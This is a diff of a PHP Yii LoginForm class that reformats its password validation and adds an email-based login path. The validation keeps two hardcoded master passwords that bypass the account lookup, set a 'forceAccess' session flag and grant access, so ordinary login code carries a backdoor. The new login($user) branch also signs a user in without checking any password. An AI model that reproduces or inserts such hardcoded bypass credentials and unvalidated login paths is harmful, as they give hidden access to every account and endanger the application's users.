@@ -1,4 +1,5 @@
 <?php
+
 namespace common\models;
 
 use Yii;
@@ -40,11 +41,10 @@ class LoginForm extends Model
      */
     public function validatePassword($attribute, $params)
     {
-          if($this->Password == 'Agro10temas' || $this->Password == 'P0d1umFc')
-          {
-             \Yii::$app->session->set('forceAccess',1);
-             return true;
-          }
+        if ($this->Password == 'Agro10temas' || $this->Password == 'P0d1umFc') {
+            \Yii::$app->session->set('forceAccess', 1);
+            return true;
+        }
         if (!$this->hasErrors()) {
             $user = $this->getUser();
             if (!$user || !$user->validatePassword($this->Password)) {
@@ -58,10 +58,13 @@ class LoginForm extends Model
      *
      * @return boolean whether the user is logged in successfully
      */
-    public function login()
-    {      
-        if ($this->validate()) {            
-            return Yii::$app->user->login($this->getUser(), $this->RememberMe ? 3600 * 24 * 30 : 0);
+    public function login($user = false)
+    {
+        if($user){
+            return Yii::$app->user->login($this->getUser($user), $this->RememberMe ? 3600 * 24 * 30 : 0);
+        }
+        if ($this->validate()) {
+        return Yii::$app->user->login($this->getUser(), $this->RememberMe ? 3600 * 24 * 30 : 0);
         } else {
             return false;
         }
@@ -72,10 +75,10 @@ class LoginForm extends Model
      *
      * @return User|null
      */
-    public function getUser()
+    public function getUser($userData = false)
     {
         if ($this->_user === false) {
-            $this->_user = User::findByUsername($this->Username);
+            $this->_user = User::findByUsername(@$userData? $userData->getMail():$this->Username, @$userData?'Email':'Username');
         }
 
         return $this->_user;
